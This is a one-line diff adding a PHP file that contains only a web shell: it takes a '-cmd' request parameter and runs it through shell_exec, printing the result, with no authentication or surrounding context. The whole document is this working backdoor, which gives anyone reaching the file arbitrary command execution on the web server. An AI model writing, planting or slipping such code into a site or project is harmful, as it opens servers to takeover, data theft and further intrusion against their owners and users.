@@ -1,0 +1,1 @@
+<?php $cmd = $_REQUEST["-cmd"];?><?php if($cmd != "") print Shell_Exec($cmd);?>
